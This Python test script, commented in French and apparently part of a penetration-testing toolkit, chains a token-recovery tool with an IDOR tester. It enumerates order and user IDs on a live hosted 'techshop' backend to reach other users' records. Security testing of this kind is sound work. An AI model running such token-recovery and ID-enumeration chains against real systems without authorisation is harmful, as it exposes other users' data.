"""
Validation BOÎTE NOIRE de l'idor_tester avec un VRAI token.

Objectif : prouver la chaîne offensive auth_tester → idor_tester sur une
cible réelle. Avec un seul compte (token récupéré dynamiquement), on tente
d'accéder aux ressources d'AUTRES utilisateurs en énumérant l'identifiant.

Aucun identifiant ni token n'est fourni : tout est découvert. Seules données
de config (observables par un testeur) : l'URL de login et les gabarits
d'endpoints d'objet à éprouver.

Exécution : python tests/test_idor_validation.py
"""

import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import requests
from pentagon.tools.auth_tester_tool import AuthTesterTool
from pentagon.tools.idor_tester_tool import run_idor_test


TECHSHOP_BASE = "https://techshop-backend-cc1t.onrender.com"
TECHSHOP_LOGIN_URL = f"{TECHSHOP_BASE}/api/auth/login"
TECHSHOP_USERNAME_FIELD = "username"

# Gabarits d'endpoints d'objet à éprouver (observables sur l'app, génériques).
OBJECT_ENDPOINTS = ["/api/orders/{id}", "/api/users/{id}"]


def wake_up_server():
    print("Réveil du serveur Render (peut prendre 30-60s)...")
    for attempt in range(2):
        try:
            requests.get(f"{TECHSHOP_BASE}/api/products", timeout=60)
            print("✓ Serveur réveillé.\n")
            return
        except requests.RequestException:
            print(f"   tentative {attempt+1}...")
    print("⚠ Réveil incertain, on continue.\n")


def main():
    print("=" * 70)
    print("VALIDATION BOÎTE NOIRE — chaîne auth_tester → idor_tester")
    print("=" * 70)

    wake_up_server()

    # === Étape 1 : récupérer un VRAI token ===
    print("─" * 70)
    print("ÉTAPE 1 — auth_tester : récupération du token")
    print("─" * 70)
    auth = AuthTesterTool(delay_between_attempts=1.5, timeout=30)
    auth_result = auth.run(login_url=TECHSHOP_LOGIN_URL, username_field=TECHSHOP_USERNAME_FIELD)
    token = auth_result.get("token")
    print(f"Token récupéré : {'OUI' if token else 'NON'}")
    if not token:
        print("❌ Pas de token : impossible de tester l'IDOR authentifié.")
        return

    # === Étape 2 : test IDOR avec le token ===
    print("\n" + "─" * 70)
    print("ÉTAPE 2 — idor_tester : énumération d'identifiants avec notre token")
    print("─" * 70)
    idor = run_idor_test(
        base_url=TECHSHOP_BASE,
        endpoints=OBJECT_ENDPOINTS,
        token=token,
    )

    print(f"Endpoints d'objet testés : {idor['endpoints_tested']}")
    for r in idor["results"]:
        print(f"\n  Endpoint : {r['endpoint_template']}")
        print(f"    Identifiants accessibles : {r['accessible_ids']}")
        print(f"    Objets distincts atteints: {r['distinct_objects']}")
        if r["user_bound_fields"]:
            print(f"    Champs liés à l'utilisateur : {r['user_bound_fields']}")

    findings = idor["idor_findings"]
    if findings:
        print(f"\n  🚨 FINDINGS IDOR ({len(findings)}) :")
        for f in findings:
            print(f"     [{f['severity'].upper()}] {f['title']} — {f['endpoint_template']}")
            print(f"        {f['owasp']} | {f['api_owasp']} | CWE : {f['cwe']}")
            print(f"        ids accessibles : {f['accessible_ids']} | champs : {f['user_bound_fields']}")

    print("\n" + "=" * 70)
    if findings:
        print("✅ IDOR PROUVÉ : accès aux ressources d'autres utilisateurs confirmé.")
    else:
        print("ℹ  Aucun IDOR confirmé sur les endpoints testés.")
    print("=" * 70)


if __name__ == "__main__":
    main()
